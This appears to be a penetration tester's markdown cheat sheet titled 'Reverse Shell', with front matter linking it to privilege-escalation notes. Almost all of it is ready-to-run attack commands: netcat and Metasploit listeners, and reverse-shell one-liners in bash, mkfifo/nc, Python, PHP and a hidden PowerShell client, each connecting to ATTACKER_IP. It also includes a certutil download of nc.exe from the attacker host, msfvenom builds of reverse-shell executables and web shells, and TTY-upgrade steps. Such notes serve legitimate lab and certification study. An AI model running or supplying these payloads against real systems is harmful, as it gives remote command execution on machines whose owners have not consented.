---
id: rev-shell
title: Reverse Shell
stage: foothold
tags: [windows, linux]
tools:
  - rlwrap nc -nvlp 4444
  - "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"
  - "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
  - "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f"
leads_to:
  - linux-sudo
  - linux-suid-caps
  - linux-cron
  - linux-kernel
  - linux-cred-hunting
  - linux-pam-polkit
  - token-impersonation
  - windows-service-misconfig
  - windows-stored-creds
  - bloodhound
---

## Listeners

```bash
rlwrap nc -nvlp PORT      # best — readline support, arrow keys
nc -nvlp PORT

# MSF handler (your one Metasploit use)
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST tun0; set LPORT PORT; run -j
```

## Linux Payloads

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# mkfifo (when bash is restricted)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP (from web context)
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## Windows Payloads

```powershell
powershell -nop -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# certutil + nc.exe
certutil -urlcache -f http://ATTACKER_IP/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER_IP PORT
```

## msfvenom Payloads

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o svc.exe
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war -o shell.war
```

## TTY Upgrade (Linux — do this immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 38 cols 120   # match your terminal: run 'stty size' locally first
```

## File Serving

```bash
python3 -m http.server 8000
impacket-smbserver share $(pwd) -smb2support   # Windows targets
```
